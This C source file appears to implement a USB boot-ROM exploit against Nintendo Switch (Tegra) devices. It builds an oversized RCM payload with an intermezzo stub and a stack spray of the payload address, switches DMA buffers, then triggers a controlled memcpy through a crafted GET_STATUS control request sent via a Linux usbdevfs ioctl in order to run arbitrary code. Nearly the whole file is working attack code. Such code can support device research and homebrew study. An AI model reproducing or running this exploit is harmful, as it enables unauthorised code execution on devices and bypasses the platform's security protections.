#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <byteswap.h>
#include <assert.h>
#include <fcntl.h>
#include <errno.h>

#include <linux/usbdevice_fs.h>
#include <sys/ioctl.h>

#include "libusb.h"

uint8_t current_buffer = 0;

void toggle_buffer()
{
    current_buffer = 1 - current_buffer;
}

libusb_device* switch_device;
libusb_device_handle* switch_handle;

uint8_t device_id[16] = {0};

int read_device_id()
{
    return libusb_bulk_transfer(switch_handle, 0x81, device_id, sizeof(device_id)/sizeof(*device_id), NULL, 1000);
}

void write_single_buffer(const uint8_t* data, size_t length)
{
    size_t sum = 0;
    for (size_t i = 0; i < length; ++i)
    {
        sum += data[i];
    }

    fprintf(stderr, "write_single_buffer(%i, %li) %li\n", data != NULL, length, sum);

    // we only write, so we don't need to write to this
    // but the interface is for read and writing
    // so it cannot promise that
    uint8_t* mutable_data = (uint8_t*)data;

    toggle_buffer();
    libusb_bulk_transfer(switch_handle, 0x01, mutable_data, length, NULL, 1000);
}

#define MIN(a, b)               (a) < (b) ? (a) : (b)

void data_write(const uint8_t* data, size_t length)
{
    size_t sum = 0;
    for (size_t i = 0; i < length; ++i)
    {
        sum += data[i];
    }

    fprintf(stderr, "write(%i, %li) %li\n", data != NULL, length, sum);

    const size_t packet_size = 0x1000;
    const uint8_t* chunk;
    size_t data_to_transmit;

    while (length)
    {
        data_to_transmit = MIN(length, packet_size);
        length -= data_to_transmit;

        chunk = data;
        data += data_to_transmit;

        write_single_buffer(chunk, data_to_transmit);
    }
}

extern uint8_t intermezzo_bin[];
extern size_t intermezzo_bin_size;

// The address where the RCM payload is placed.
// This is fixed for most device.
#define RCM_PAYLOAD_ADDR        0x40010000

// The address where the user payload is expected to begin.
#define PAYLOAD_START_ADDR      0x40010E40

// Specify the range of addresses where we should inject oct
// payload address.
#define STACK_SPRAY_START       0x40014E40
#define STACK_SPRAY_END         0x40017000

#define PAYLOAD_SIZE            0x30298
#define PADDING1                680
#define PADDING2                PAYLOAD_START_ADDR - RCM_PAYLOAD_ADDR
#define PADDING3                STACK_SPRAY_START - PAYLOAD_START_ADDR

void send_payload(const uint8_t* target_payload, const size_t target_size)
{
    // Use the maximum length accepted by RCM, so we can transmit as much payload as
    // we want; we'll take over before we get to the end.
    uint8_t payload[PAYLOAD_SIZE];
    assert(payload);

    memset(payload, 0, PAYLOAD_SIZE);

    const uint32_t length = PAYLOAD_SIZE;
#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
    length = bswap_32(length);
#endif

    uint8_t* payload_head = payload;
    memcpy(payload_head, (uint8_t*)&length, sizeof(length) / sizeof(*payload_head));
    // pad out to 680 so the payload starts at the right address in IRAM
    payload_head += PADDING1;

    fprintf(stderr, "Setting ourselves up to smash the stack...\n");
    memcpy(payload_head, intermezzo_bin, intermezzo_bin_size);
    payload_head += PADDING2;


    const size_t spray_size = STACK_SPRAY_START - PAYLOAD_START_ADDR;
    const size_t target_rest_size = target_size - spray_size;
    size_t repeat_count = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;

    uint32_t payload_address = RCM_PAYLOAD_ADDR;
#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
    payload_address = bswap_32(payload_address);
#endif

    memcpy(payload_head, target_payload, spray_size);
    payload_head += spray_size;

    for (size_t i = 0; i < repeat_count; ++i)
    {
        const size_t n = sizeof(length) / sizeof(*payload_head);

        memcpy(payload_head, (uint8_t*)&payload_address, n);
        payload_head += n;
    }

    memcpy(payload_head, target_payload+spray_size, target_rest_size);
    payload_head += target_rest_size;

    const size_t padding_size = 0x1000 - ((payload_head - payload) % 0x1000);
    payload_head += padding_size;

    const size_t payload_size = payload_head - payload;
    assert(payload_size <= PAYLOAD_SIZE);

    fprintf(stderr, "Uploading payload...\n");
    fprintf(stderr, "%i\n", current_buffer);
    data_write(payload, payload_size);
}

void get_target(const char* path, uint8_t** target_payload, size_t* target_size)
{
    FILE* fd = fopen(path, "rb");
    if (!fd)
        return;

    fseek(fd, 0L, SEEK_END);
    *target_size = ftell(fd);
    rewind(fd);

    *target_payload = malloc(*target_size);
    fread(*target_payload, 1, *target_size, fd);

    fclose(fd);
}

#define DEFAULT_VID             0x0955
#define DEFAULT_PID             0x7321

const uint32_t COPY_BUFFER_ADDRESSES[] = {0x40005000, 0x40009000};
#define STACK_END               0x40010000

uint32_t get_current_buffer_address()
{
    return COPY_BUFFER_ADDRESSES[current_buffer];
}

void switch_to_highbuf()
{
    fprintf(stderr, "switch_to_highbuf()\n");
    if (get_current_buffer_address() != COPY_BUFFER_ADDRESSES[1])
    {
        uint8_t data[0x1000] = { 0 };
        data_write(data, sizeof(data) / sizeof(data[0]));
    }
}

#define SETUP_PACKET_SIZE 8
#define IOCTL_IOR 0x80000000
#define IOCTL_NR_SUBMIT_URB 10

void linux_trigger_vulnerability(uint16_t length)
{
    fprintf(stderr, "linux_trigger_vulnerability(%i)\n", length);

#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
    length = bswap_16(length);
#endif

    uint8_t setup_packet[] = {
        0x82, // STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT
        0x00, // GET_STATUS
        0x00, 0x00,
        0x00, 0x00,
        length & 0xFF, length >> 8
    };

    fprintf(stderr, "setup_packet ");
    for (size_t i = 0; i < sizeof(setup_packet)/sizeof(setup_packet[0]); ++i)
    {
        fprintf(stderr, "\\x%02X", setup_packet[i]);
    }
    fprintf(stderr, "\n");

    const size_t buffer_size = SETUP_PACKET_SIZE + length;
    uint8_t *buffer = malloc(buffer_size);

    memcpy(buffer, setup_packet, sizeof(setup_packet)/sizeof(*setup_packet));

    uint8_t bus = libusb_get_bus_number(switch_device);
    uint8_t device = libusb_get_device_address(switch_device);

    char buf[24];
    sprintf(buf, "/dev/bus/usb/%03d/%03d", bus, device);

    int fd = open(buf, O_RDWR);
    if (fd < 0)
    {
        fprintf(stderr, "Could not open '%s'\n", buf);
        exit(1);
    }

    struct usbdevfs_urb request;
    memset(&request, 0, sizeof(request));

    request.type = 2;
    request.endpoint = 0;
    request.buffer = buffer;
    request.buffer_length = buffer_size;

    unsigned long ioctl_number = (IOCTL_IOR | sizeof(request) << 16 | 'U' << 8 | IOCTL_NR_SUBMIT_URB);
    fprintf(stderr, "ioctl(%i, %lu, %p)\n", fd, ioctl_number, &request);

    int result = ioctl(fd, ioctl_number, &request);
    if (result < 0)
    {
        printf ("Error! USBDEVFS_SUBMITURB : ioctl returned : %d\n errno =%s\n", result, strerror(errno));
    }
}

#define trigger_vulnerability linux_trigger_vulnerability

void trigger_controlled_memcpy()
{
    size_t length = STACK_END - get_current_buffer_address();

    return trigger_vulnerability(length);
}

libusb_device* get_device_vp(libusb_device **devs, uint16_t vid, uint16_t pid)
{
    libusb_device *dev;
    int i = 0, j = 0;
    uint8_t path[8];

    while ((dev = devs[i++]) != NULL) {
        struct libusb_device_descriptor desc;
        int r = libusb_get_device_descriptor(dev, &desc);
        if (r < 0) {
            fprintf(stderr, "failed to get device descriptor");
            return NULL;
        }

        if (desc.idVendor == vid &&
            desc.idProduct == pid)
            return dev;
    }

    return NULL;
}


libusb_device* find_switch()
{
    libusb_device** devs;
    libusb_device* dev = NULL;
    int r;
    ssize_t cnt;

    cnt = libusb_get_device_list(NULL, &devs);
    if (cnt < 0){
        return dev;
    }

    dev = get_device_vp(devs, 0x0955, 0x7321);

    libusb_free_device_list(devs, 1);

    return dev;
}

int main(int argc, char** argv)
{
    if (argc > 1)
    {
        if (libusb_init(NULL) < 0)
        {
            fprintf(stderr, "Failed to init libusb\n");
            return -1;
        }

        char* target_path = argv[1];
        uint8_t* target_payload = NULL;
        size_t target_size;

        switch_device = find_switch();
        if (!switch_device)
        {
            fprintf(stderr, "No Switch found\n");
            return -1;
        }

        int r = libusb_open(switch_device, &switch_handle);
        if (r)
        {
            fprintf(stderr, "libusb_open: %s\n", libusb_error_name(r));
            exit(1);
        }

        if (read_device_id())
        {
            fprintf(stderr, "Failed to read Device ID\n");
            exit(1);
        }

        get_target(target_path, &target_payload, &target_size);

        if (!target_payload)
        {
            fprintf(stderr, "Invalid payload path specified!\n") ;
            return -1;
        }

        fprintf(stderr, "Found a Tegra with Device ID:");
        for (size_t i = 0; i < 16; ++i)
        {
            fprintf(stderr, " %02X", device_id[i]);
        }
        fprintf(stderr, "\n");

        send_payload(target_payload, target_size);

        fprintf(stderr, "%i\n", current_buffer);
        switch_to_highbuf();
        fprintf(stderr, "%i\n", current_buffer);

        fprintf(stderr, "Smashing the stack...\n");
        fprintf(stderr, "%i\n", current_buffer);
        trigger_controlled_memcpy();

        libusb_close(switch_handle);
        libusb_exit(NULL);
    }
    else
        fprintf(stderr, "No payload path specified!\n");

    return 0;
}
